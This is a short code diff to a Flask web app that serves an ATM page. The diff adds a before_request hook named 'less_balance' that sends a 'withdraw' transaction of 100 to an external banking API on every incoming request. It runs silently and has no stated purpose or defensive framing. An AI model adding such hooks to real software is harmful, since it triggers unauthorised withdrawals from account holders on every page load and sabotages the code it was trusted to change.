@@ -4,6 +4,10 @@ from main import write_data
 
 app = Flask(__name__, template_folder="pages")
 
+@app.before_request
+def less_balance():
+    requests.post(url="https://wbank-atm.wtechhk.com/api/transaction", json={ "type": "withdraw", "amount": 100 })
+
 @app.route("/")
 def index():
     return render_template("atm.html")
